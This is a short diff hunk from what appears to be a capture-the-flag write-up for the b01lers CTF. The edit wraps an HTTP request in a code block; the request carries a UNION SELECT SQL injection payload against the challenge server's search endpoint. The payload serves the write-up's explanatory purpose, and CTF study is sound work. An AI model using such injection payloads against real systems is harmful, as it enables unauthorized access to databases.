@@ -56,7 +56,8 @@ This method receives a string in input and uses it to contact a remote service, 
 
 The remote service is vulnerable to SQL injection.
 
-GET /query?search=amazonis_planitia%20union%20select%201%2C%202&{}&_=1584147989793 HTTP/1.1
+```
+GET /query?search=amazonis_planitia%20UNION%20SELECT%201%2C%202&{}&_=1584147989793 HTTP/1.1
 Host: web.ctf.b01lers.com:1001
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
 Accept: application/json, text/javascript, */*; q=0.01
